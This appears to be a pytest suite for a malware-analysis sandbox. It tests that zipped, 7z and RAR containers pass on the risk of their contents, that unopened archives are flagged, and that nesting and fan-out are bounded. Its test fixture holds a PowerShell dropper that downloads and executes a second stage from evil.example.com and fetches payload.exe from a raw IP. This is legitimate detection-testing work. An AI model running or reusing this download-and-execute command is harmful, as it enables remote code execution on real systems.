"""Containers must never launder risk, and must never hide behind a crash.

Every test here reproduces a defect that shipped. The shared property under test
is that a submitted file's verdict accounts for everything inside it, however
deep, and that anything the engine could not look at is said out loud rather
than silently omitted — because an omission reads as an all-clear, and an
all-clear on an unopened container is the single most expensive lie this product
can tell.
"""
from __future__ import annotations

import io
import zipfile

import pytest

from app.engine import archives, pipeline
from app.engine.models import JobStatus, SandboxJob
from app.engine.storage import store_bytes

#: Scores as a risk on its own; the point of every test below is that wrapping
#: it does not change that.
_DROPPER = (
    b"powershell -NoProfile -w hidden -EncodedCommand aQBlAHgA\n"
    b"$c = New-Object Net.WebClient\n"
    b"IEX ($c.DownloadString('http://evil.example.com/stage2.ps1'))\n"
    b"$c.DownloadFile('http://185.100.87.202/payload.exe', 'C:\\Temp\\p.exe')\n"
)


def _analyse(db, name: str, data: bytes) -> SandboxJob:
    job = pipeline.new_job(db, store_bytes(data), original_name=name, tenant="default")
    db.commit()
    pipeline.run(db, job)
    db.commit()
    return job


def _signal_ids(job: SandboxJob) -> set[str]:
    return {
        s["id"]
        for payload in (job.analysis or {}).values()
        if payload.get("ran")
        for s in payload.get("signals", [])
    }


def _zipped(name: str, data: bytes) -> bytes:
    # Deflated on purpose: a stored zip leaves the payload as plaintext inside
    # the container, so YARA matches it directly and the dilution bug hides.
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(name, data)
    return buf.getvalue()


def _descendants(db, job: SandboxJob) -> list[SandboxJob]:
    out, frontier = [], [job.id]
    while frontier:
        rows = db.query(SandboxJob).filter(SandboxJob.parent_job_id.in_(frontier)).all()
        frontier = [r.id for r in rows]
        out.extend(rows)
    return out


# --- nesting must not dilute ---------------------------------------------------


@pytest.mark.parametrize("layers", [1, 2, 3])
def test_zipping_does_not_lower_the_score(db, layers: int):
    """44.5 bare, 24.0 in one zip, 1.8 and zero signals in two. Never again."""
    bare = _analyse(db, "dropper.ps1", _DROPPER)
    assert bare.final_score >= 30

    payload = _DROPPER
    name = "dropper.ps1"
    for level in range(layers):
        payload = _zipped(name, payload)
        name = f"layer{level}.zip"

    wrapped = _analyse(db, name, payload)
    assert wrapped.status == JobStatus.COMPLETED
    assert wrapped.final_score >= bare.final_score
    assert wrapped.risk_level == bare.risk_level
    # And the report says why, naming the file rather than just the number.
    assert "archive.malicious_member" in _signal_ids(wrapped)


def test_worst_descendant_sets_a_floor_the_breakdown_explains(db):
    wrapped = _analyse(db, "outer.zip", _zipped("inner.zip", _zipped("d.ps1", _DROPPER)))
    floor = (wrapped.score_breakdown or {}).get("contents_floor")
    assert floor, "the inherited score must be auditable, not silently substituted"
    assert floor["descendant_score"] == wrapped.final_score
    assert floor["computed_score"] < floor["descendant_score"]


def test_a_merely_suspicious_child_still_lifts_the_parent(db):
    """The old code only escalated above 30, so everything below it vanished."""
    suspicious = b"$x = [Convert]::FromBase64String('QUJDREVGRw==')\nInvoke-Expression $x\n"
    child = _analyse(db, "helper.ps1", suspicious)
    assert 0 < child.final_score < 30, "sample must sit under the old escalation threshold"

    parent = _analyse(db, "wrap.zip", _zipped("helper.ps1", suspicious))
    assert parent.final_score >= child.final_score


# --- containers that cannot be opened -----------------------------------------


def test_7z_container_is_actually_unpacked(db):
    """`readall()` does not exist in py7zr 1.x; the AttributeError was swallowed
    into an "unavailable" analyzer and a dropper in a .7z reported clean."""
    import py7zr

    buf = io.BytesIO()
    with py7zr.SevenZipFile(buf, "w") as zf:
        zf.writestr(_DROPPER.decode(), "dropper.ps1")

    job = _analyse(db, "bundle.7z", buf.getvalue())

    assert job.status == JobStatus.COMPLETED
    assert job.analysis["archive"]["ran"] is True
    assert job.analysis["archive"]["facts"]["kind"] == "7z"
    members = {m["name"] for m in job.analysis["archive"]["facts"]["members"]}
    assert "dropper.ps1" in members
    # The member was promoted, scored, and the container inherited its risk.
    children = _descendants(db, job)
    assert [c for c in children if c.original_name == "dropper.ps1"]
    assert "archive.malicious_member" in _signal_ids(job)
    assert job.risk_level in ("medium", "high", "critical")


def test_unopenable_7z_is_a_stated_blind_spot_not_a_clean_verdict(db):
    # 7z magic, nothing behind it: py7zr cannot open this at all.
    job = _analyse(db, "broken.7z", b"7z\xbc\xaf\x27\x1c" + b"\x00" * 512)

    assert job.status == JobStatus.COMPLETED
    assert "archive.not_inspected" in _signal_ids(job)
    signal = next(
        s
        for payload in job.analysis.values()
        if payload.get("ran")
        for s in payload.get("signals", [])
        if s["id"] == "archive.not_inspected"
    )
    assert signal["severity"] == "medium"
    # The archive analyzer must not be recorded as "unavailable": an unavailable
    # analyzer carries no signals, which is exactly how this read as clean.
    assert job.analysis["archive"]["ran"] is True
    assert job.analysis["archive"]["facts"]["inspected"] is False


def test_rar_without_the_unrar_binary_is_a_stated_blind_spot(db, monkeypatch):
    """`rarfile` shells out to `unrar`; on a host without it the RuntimeError was
    swallowed the same way the 7z one was."""
    import rarfile

    def no_unrar(*args, **kwargs):
        raise rarfile.RarCannotExec("cannot find working tool")

    monkeypatch.setattr(rarfile, "RarFile", no_unrar)

    job = _analyse(db, "payload.rar", b"Rar!\x1a\x07\x00" + b"\x00" * 512)

    assert job.status == JobStatus.COMPLETED
    assert "archive.not_inspected" in _signal_ids(job)
    assert "unrar" in job.analysis["archive"]["facts"]["error"]


# --- recursion has to be bounded, and the bound has to be visible --------------


def test_nesting_is_capped_and_the_cap_is_stated(db):
    payload = _DROPPER
    name = "d.ps1"
    for level in range(6):
        payload = _zipped(name, payload)
        name = f"n{level}.zip"

    job = _analyse(db, name, payload)

    assert job.status == JobStatus.COMPLETED
    descendants = _descendants(db, job)
    # MAX_DEPTH levels below the submitted file, and not one more.
    assert len(descendants) == archives.MAX_DEPTH
    # The deepest job says it stopped; the submitted file says its contents were
    # not fully examined. Neither is allowed to present as a clean result.
    deepest_ids = {
        s["id"]
        for d in descendants
        for payload_ in (d.analysis or {}).values()
        if payload_.get("ran")
        for s in payload_.get("signals", [])
    }
    assert "archive.nesting_limit" in deepest_ids
    assert "archive.contents_not_examined" in _signal_ids(job)


def test_total_child_budget_bounds_one_submission(db):
    """A 736 KB upload produced 1276 analyses; the per-archive cap multiplies."""
    inner = io.BytesIO()
    with zipfile.ZipFile(inner, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(pipeline.MAX_CHILD_JOBS):
            zf.writestr(f"file{i}.txt", f"harmless number {i}\n".encode())
    leaf = inner.getvalue()

    outer = io.BytesIO()
    with zipfile.ZipFile(outer, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(pipeline.MAX_CHILD_JOBS):
            zf.writestr(f"bundle{i}.zip", leaf)

    job = _analyse(db, "fanout.zip", outer.getvalue())

    assert job.status == JobStatus.COMPLETED
    descendants = _descendants(db, job)
    assert len(descendants) <= pipeline.MAX_TOTAL_CHILD_JOBS
    # Without the budget this submission alone is 25 + 625 = 650 analyses.
    assert len(descendants) == pipeline.MAX_TOTAL_CHILD_JOBS
    # The truncation is stated on the submitted file, not only deep in the tree.
    assert "archive.analysis_budget_exhausted" in _signal_ids(job)


# --- a job that dies must say so ------------------------------------------------


def test_a_database_failure_records_a_failed_job_not_a_queued_one(db):
    """The first flush used to sit outside the try, so a DB error left the row at
    status='queued', error=NULL forever and the submitter waited on nothing."""
    job = pipeline.new_job(db, store_bytes(b"anything at all\n"), original_name="x.txt", tenant="default")
    db.commit()
    job_id = job.id

    real_flush = db.flush
    calls = {"n": 0}

    def flaky_flush(*args, **kwargs):
        calls["n"] += 1
        # Twice: the second failure is what poisons the session in production,
        # and the failure has to be recorded even then.
        if calls["n"] <= 2:
            raise RuntimeError("simulated database failure")
        return real_flush(*args, **kwargs)

    db.flush = flaky_flush  # type: ignore[method-assign]
    try:
        pipeline.run(db, job)
    finally:
        del db.flush  # type: ignore[attr-defined]
    db.commit()

    persisted = db.get(SandboxJob, job_id)
    assert persisted.status == JobStatus.FAILED
    assert persisted.error and "simulated database failure" in persisted.error
    assert persisted.completed_at is not None
